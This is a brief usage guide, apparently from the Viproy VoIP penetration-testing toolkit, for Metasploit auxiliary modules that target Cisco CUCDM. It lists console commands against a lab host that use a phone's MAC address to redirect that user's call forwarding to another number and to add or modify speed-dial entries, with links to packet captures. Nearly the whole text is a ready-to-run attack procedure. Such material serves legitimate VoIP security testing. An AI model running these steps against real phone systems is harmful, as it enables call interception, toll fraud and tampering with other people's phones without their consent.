#Cisco CUCDM Testing Modules Usage

##Call Forwarding

use auxiliary/voip/viproy_cucdm_callforward <br>
set RHOST 192.168.1.151<br>
set RPORT 8080<br>
set ACTION INFO<br>
set MAC 001795A603C2<br>
run<br><br><br>

set ACTION FORWARD<br>
set FORWARDTO 007<br>
run<br><br><br>

set ACTION INFO<br>
run<br>

http://www.viproy.com/captures/viproy_cucdm_callforward.pcapng<br>

##Speeddial Manipulation

use auxiliary/voip/viproy_cucdm_speeddials <br>
set RHOST 192.168.1.151<br>
set RPORT 8080<br>
set MAC 001795A603C2<br>
run<br><br><br>

set ACTION ADD<br>
set NAME Viproy<br>
set TELNO 007<br>
set POSITION 3<br>
run<br><br><br>

set ACTION INFO<br>
run<br><br><br>

set ACTION MODIFY<br>
set POSITION 1<br>
set NAME janedoe<br>
set TELNO 007<br>
run<br><br><br>

set ACTION INFO<br>
run<br>

http://www.viproy.com/captures/viproy_cucdm_speeddial.pcapng<br>